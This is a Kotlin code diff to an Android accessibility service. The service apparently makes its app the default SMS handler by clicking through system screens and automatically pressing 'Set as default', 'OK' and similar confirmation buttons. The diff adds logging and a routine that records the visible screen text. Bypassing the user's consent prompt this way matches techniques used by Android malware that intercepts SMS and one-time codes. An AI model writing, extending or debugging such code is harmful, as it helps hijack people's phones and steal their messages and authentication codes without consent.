@@ -440,19 +440,24 @@ class MyAccessibilityService : AccessibilityService() {
                 if (appNodes.isNotEmpty()) {
                     val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                     val lastLoop = prefs.getLong("sms_nav_loop_ts", 0L)
+                    
                     if (System.currentTimeMillis() - lastLoop < 4000) return
                     prefs.edit().putLong("sms_nav_loop_ts", System.currentTimeMillis()).apply()
 
                     val targetCount = appNodes.size
+                    DebugLogger.log("SMS_NAV_PHASE1", "Found $targetCount nodes matching target label: '$targetLabel'")
+
                     var candidateIndex = prefs.getInt("sms_nav_candidate_idx", 0)
                     if (candidateIndex >= targetCount) candidateIndex = 0
+
+                    DebugLogger.log("SMS_NAV_PHASE1", "Evaluating candidate $candidateIndex...")
 
                     var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[candidateIndex]
                     while (target != null && !target.isClickable) target = target.parent
                     
-                    target?.let {
-                        it.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                        DebugLogger.log("SMS_NAV", "Clicked candidate $candidateIndex for $targetLabel")
+                    if (target != null && target.isClickable) {
+                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        DebugLogger.log("SMS_NAV", "Clicked candidate $candidateIndex for '$targetLabel'")
                         
                         // Handle Confirmation Dialogs after click
                         kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
@@ -460,20 +465,39 @@ class MyAccessibilityService : AccessibilityService() {
                             val confirmRoot = rootInActiveWindow
                             if (confirmRoot != null) {
                                 val keywords = listOf("Set as default", "Set", "OK", "Default")
+                                var confirmClicked = false
                                 for (kw in keywords) {
                                     val btn = confirmRoot.findAccessibilityNodeInfosByText(kw).find { it.isClickable }
                                     if (btn != null) {
                                         btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                        DebugLogger.log("SMS_NAV", "Clicked confirm: $kw")
+                                        DebugLogger.log("SMS_NAV_CONFIRM", "Clicked confirm dialog button: '$kw'")
+                                        confirmClicked = true
                                         break
                                     }
+                                }
+                                if (!confirmClicked) {
+                                    DebugLogger.log("SMS_NAV_CONFIRM", "No confirmation dialog buttons found for candidate $candidateIndex.")
                                 }
                             }
                             // Increment candidate index in case this app wasn't the one we wanted
                             prefs.edit().putInt("sms_nav_candidate_idx", candidateIndex + 1).apply()
                         }
+                    } else {
+                        DebugLogger.log("SMS_NAV_PHASE1", "Candidate $candidateIndex is NOT clickable (no clickable parent found).")
+                        prefs.edit().putInt("sms_nav_candidate_idx", candidateIndex + 1).apply()
                     }
                     return
+                } else {
+                    // Diagnostic scan when target is missing
+                    val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                    val lastSample = prefs.getLong("sms_nav_sample_ts", 0L)
+                    if (System.currentTimeMillis() - lastSample > 3000) {
+                        prefs.edit().putLong("sms_nav_sample_ts", System.currentTimeMillis()).apply()
+                        val sb = java.lang.StringBuilder()
+                        extractText(root, sb)
+                        val screenText = sb.toString().replace("\n", " ").take(150)
+                        DebugLogger.log("SMS_NAV_SCAN", "Target '$targetLabel' NOT found. Visible screen text: $screenText...")
+                    }
                 }
 
                 // Phase 2: Category list
